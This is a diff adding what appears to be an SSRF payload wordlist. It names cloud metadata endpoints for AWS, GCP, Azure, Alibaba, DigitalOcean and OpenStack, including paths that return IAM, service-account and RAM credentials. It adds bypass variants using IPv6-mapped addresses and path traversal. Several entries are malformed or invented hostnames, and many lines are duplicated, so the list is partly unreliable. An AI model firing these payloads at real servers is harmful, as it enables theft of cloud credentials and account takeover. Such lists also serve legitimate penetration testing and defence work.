@@ -1,0 +1,173 @@
+# AWS EC2 Metadata Endpoints
+http://169.254.169.254
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/public-keys/
+http://instance-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/local-hostname
+http://169.254.169.254/latest/meta-data/public-hostname
+http://169.254.169.254/latest/meta-data/public-ipv4
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/meta-data/mac
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/vpc-id
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/subnet-id
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/security-group-ids
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/ipv4-associations/
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/interface-id
+http://169.254.169.254/latest/meta-data/block-device-mapping/
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/vpc-ipv4-cidr-block
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/subnet-ipv4-cidr-block
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/vpc-ipv4-cidr-blocks
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/subnet-ipv4-cidr-blocks
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/owner-id
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/vpc-id
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/subnet-id
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/security-group-ids
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/ipv4-associations/
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/interface-id
+http://169.254.169.254/latest/meta-data/block-device-mapping/
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/vpc-ipv4-cidr-block
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/subnet-ipv4-cidr-block
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/vpc-ipv4-cidr-blocks
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/subnet-ipv4-cidr-blocks
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/owner-id
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/instance-id
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/instance-type
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/placement/availability-zone
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/placement/group-name
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/[mac]/placement/tenancy
+
+# GCP Metadata Endpoints
+http://metadata.google.internal
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+http://169.254.169.254/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/tags
+http://metadata.google.internal/computeMetadata/v1/instance/zone
+http://metadata.google.internal/computeMetadata/v1/instance/machine-type
+http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip
+http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip
+http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/mac
+
+# Azure Metadata Endpoints
+http://169.254.169.254/metadata/instance
+http://169.254.169.254/metadata/instance/compute
+http://169.254.169.254/metadata/instance/network
+http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/
+http://169.254.169.254/metadata/instance/compute/name?api-version=2017-08-01
+http://169.254.169.254/metadata/instance/network/interface/0/macAddress?api-version=2017-08-01
+http://169.254.169.254/metadata/instance/compute/location?api-version=2017-08-01
+http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2017-08-01
+
+# DigitalOcean Metadata Endpoints
+http://169.254.169.254/metadata/v1
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
+http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/vendor-data
+
+# Alibaba Cloud Metadata Endpoints
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/instance/region-id
+http://100.100.100.200/latest/meta-data/instance/network-type
+http://100.100.100.200/latest/meta-data/instance/zone-id
+http://100.100.100.200/latest/meta-data/instance/ram/roles/
+http://100.100.100.200/latest/meta-data/instance/ram/security-credentials/
+http://100.100.100.200/latest/meta-data/instance/ram/security-credentials/role-name
+http://100.100.100.200/latest/meta-data/instance/ram/security-credentials/[ROLE NAME]
+
+# OpenStack Metadata
+http://169.254.169.254/openstack/latest/meta_data.json
+http://169.254.169.254/openstack/latest/user_data
+http://169.254.169.254/openstack/latest/network_data.json
+http://169.254.169.254/openstack/latest/vendor_data.json
+
+# Cloud-Init user-data
+http://169.254.169.254/latest/user-data
+
+# Generic Metadata Endpoints
+http://metadata
+http://metadata/v1
+http://metadata/v1/instance
+http://metadata/computeMetadata/v1/
+http://metadata/latest/meta-data/
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/public-keys/
+
+# Kubernetes Metadata Endpoints
+http://169.254.169.254/metadata/
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/instance-id
+http://169.254.169.254/metadata/v1/hostname
+
+# Extra/Obscure
+http://[::ffff:169.254.169.254]/
+http://[::ffff:100.100.100.200]/
+http://[::ffff:metadata.google.internal]/
+http://[::ffff:metadata]/
+http://[::ffff:metadata.google.internal]/computeMetadata/v1/
+http://[::ffff:169.254.169.254]/latest/meta-data/
+http://[::ffff:169.254.169.254]/latest/user-data/
+http://[::ffff:100.100.100.200]/latest/meta-data/
+http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/
+
+# Internal Hostnames
+metadata.google.internal
+metadata.cloud.internal
+metadata.aws.internal
+metadata.azure.internal
+metadata.openstack.internal
+metadata.digitalocean.internal
+metadata.alicloud.internal
+metadata.kubernetes.internal
+
+# Alternative Paths
+/latest/meta-data/
+/latest/user-data/
+/latest/dynamic/instance-identity/document
+/latest/meta-data/iam/security-credentials/
+/latest/meta-data/public-keys/
+/latest/meta-data/hostname
+/latest/meta-data/mac
+/latest/meta-data/network/interfaces/macs/
+/latest/meta-data/block-device-mapping/
+/latest/meta-data/placement/availability-zone
+/latest/meta-data/placement/group-name
+/latest/meta-data/placement/tenancy
+
+# Path Traversal
+http://169.254.169.254/../../../../../../../../../../
+http://169.254.169.254/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f
+http://metadata.google.internal/../../../../../../../../../../
+http://100.100.100.200/../../../../../../../../../../
